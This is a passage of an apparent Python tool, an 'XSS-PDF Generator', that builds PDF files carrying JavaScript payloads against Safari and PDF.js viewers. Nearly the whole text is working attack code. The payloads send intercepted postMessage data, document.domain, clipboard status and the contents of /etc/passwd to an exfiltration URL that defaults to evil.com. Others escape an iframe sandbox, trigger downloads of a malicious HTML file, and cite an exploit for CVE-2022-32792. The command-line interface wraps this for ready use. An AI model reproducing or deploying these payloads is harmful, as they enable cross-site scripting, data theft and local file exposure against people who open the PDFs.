<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:window.addEventListener('message',function(e){{fetch('{url}/message?data='+encodeURIComponent(e.data))}});window.postMessage('PDF XSS payload','*'))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_postmessage.pdf", payload8, 
              "Safari postMessage exploitation to intercept and exfiltrate messages", pdf_version)

    # Payload 9: Safari WebKit clipboard access
    payload9 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:navigator.clipboard.writeText('Clipboard text compromised').then(function(){{fetch('{url}/clipboard?status=compromised')}}).catch(function(err){{fetch('{url}/clipboard?error='+encodeURIComponent(err))}});)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_clipboard.pdf", payload9, 
              "Safari WebKit clipboard access to write to user's clipboard", pdf_version)

    # Payload 10: Safari WebKit CVE-2022-32792
    payload10 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:location='javascript:/*</script><svg/onload=fetch("{url}/cve?domain="+document.domain)>//';//')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_cve_2022_32792.pdf", payload10, 
              "Safari WebKit CVE-2022-32792 exploitation to bypass XSS protections", pdf_version)

    # Payload 11: Safari WebKit iframe sandbox escape
    payload11 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<iframe sandbox="allow-scripts" srcdoc="<script>fetch(\\\"{url}/sandbox?domain=\\\"+document.domain)</script>"></iframe>')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_iframe_sandbox.pdf", payload11, 
              "Safari WebKit iframe sandbox escape using allow-scripts permission", pdf_version)

    # Payload 12: Safari PDF viewer download trigger
    payload12 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:var a=document.createElement('a');a.href='data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9ldmlsLmNvbS9sb2cnKTwvc2NyaXB0Pg==';a.download='malicious.html';a.click();fetch('{url}/download?status=attempted'))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_download.pdf", payload12, 
              "Safari PDF viewer download trigger to save malicious HTML file", pdf_version)

def generate_pdfjs_payloads(url, output_dir, pdf_version):
    """Generate PDF.js-specific XSS payloads."""
    create_directory(output_dir)
    
    # Payload 1: Basic PDF.js link annotation
    payload1 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:alert(document.domain))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
347
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_basic_link_annotation.pdf", payload1, 
              "Basic PDF.js link annotation exploit to execute JavaScript", pdf_version)

    # Payload 2: PDF.js URL handler with HTML
    payload2 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.write('<img src=x onerror=fetch("{url}/pdfjs?domain="+document.domain)>'))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
391
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_url_handler.pdf", payload2, 
              "PDF.js URL handler with HTML to exfiltrate domain information", pdf_version)

    # Payload 3: PDF.js form submission
    payload3 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/AcroForm<</Fields[4 0 R]>>>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Widget/Rect[0 0 0 0]/FT/Tx/T(a)/AA<</F 5 0 R>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
window.location='javascript:fetch("{url}/form?domain="+document.domain)';
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000079 00000 n
0000000132 00000 n
0000000228 00000 n
0000000317 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
424
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_form_submission.pdf", payload3, 
              "PDF.js form submission to exfiltrate domain information", pdf_version)

    # Payload 4: PDF.js file URI handler
    payload4 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:fetch('file:///etc/passwd').then(r=>r.text()).then(t=>fetch('{url}/file?data='+encodeURIComponent(t))))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
391
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_file_uri.pdf", payload4, 
              "PDF.js file URI handler to read and exfiltrate local system files", pdf_version)

    # Payload 5: PDF.js DOM XSS
    payload5 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.getElementById('viewerContainer').innerHTML='<img src=x onerror=fetch("{url}/dom?domain="+document.domain)>')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
430
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_dom_xss.pdf", payload5, 
              "PDF.js DOM XSS by replacing viewer container content", pdf_version)

    # Payload 6: PDF.js iframe injection
    payload6 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.appendChild(document.createElement('iframe')).src='javascript:fetch("{url}/iframe?domain="+document.domain)')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
437
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_iframe_injection.pdf", payload6, 
              "PDF.js iframe injection to execute JavaScript in a new context", pdf_version)

    # Payload 7: PDF.js URL fragment abuse
    payload7 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:location.hash='#javascript:fetch("{url}/fragment?domain="+document.domain)';eval(decodeURIComponent(location.hash.substring(1))))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
441
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_url_fragment.pdf", payload7, 
              "PDF.js URL fragment abuse to execute JavaScript from URL hash", pdf_version)

    # Payload 8: PDF.js history manipulation
    payload8 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:history.pushState(null,null,'javascript:fetch("{url}/history?domain="+document.domain)');location.reload())>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
409
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_history_manipulation.pdf", payload8, 
              "PDF.js history manipulation to execute JavaScript on page reload", pdf_version)

    # Payload 9: PDF.js code execution via data URI
    payload9 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly97dXJsfS9kYXRhP2RvbWFpbj0nK2RvY3VtZW50LmRvbWFpbik7PC9zY3JpcHQ+)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
413
%%EOF"""
    write_pdf(f"{output_dir}/pdfjs_data_uri.pdf", payload9, 
              "PDF.js code execution via data URI to execute JavaScript", pdf_version)

def main():
    """Main function to generate all PDF payloads in Files directory."""
    import argparse
    
    parser = argparse.ArgumentParser(description="XSS-PDF Generator - Browser-specific PDF payloads")
    parser.add_argument("-u", "--url", default="http://evil.com/collect", 
                       help="Target URL for data exfiltration")
    parser.add_argument("-o", "--output-dir", default="Files", 
                       help="Output directory for PDF files (default: Files)")
    parser.add_argument("-b", "--browser", choices=["chrome", "firefox", "safari", "pdfjs", "all"], 
                       default="all", help="Target browser (default: all)")
    parser.add_argument("-v", "--pdf-version", choices=list(PDF_VERSIONS.keys()), 
                       default="1.7", help="PDF version (default: 1.7)")
    
    args = parser.parse_args()
    
    print(f"🚀 XSS-PDF Generator")
    print(f"Target URL: {args.url}")
    print(f"Output Directory: {args.output_dir}")
    print(f"Browser Target: {args.browser}")
    print(f"PDF Version: {args.pdf_version}")
    print()
    
    # Create output directory
    create_directory(args.output_dir)
    
    # Generate payloads based on browser selection
    if args.browser == "all" or args.browser == "chrome":
        print("🔥 Generating Chrome payloads...")
        generate_chrome_payloads(args.url, args.output_dir, args.pdf_version)
        
    if args.browser == "all" or args.browser == "firefox":
        print("🔥 Generating Firefox payloads...")
        generate_firefox_payloads(args.url, args.output_dir, args.pdf_version)
        
    if args.browser == "all" or args.browser == "safari":
        print("🔥 Generating Safari payloads...")
        generate_safari_payloads(args.url, args.output_dir, args.pdf_version)
        
    if args.browser == "all" or args.browser == "pdfjs":
        print("🔥 Generating PDF.js payloads...")
        generate_pdfjs_payloads(args.url, args.output_dir, args.pdf_version)
    
    print(f"\n✅ PDF generation complete! Files saved in {args.output_dir}/ directory")

if __name__ == "__main__":
    main()
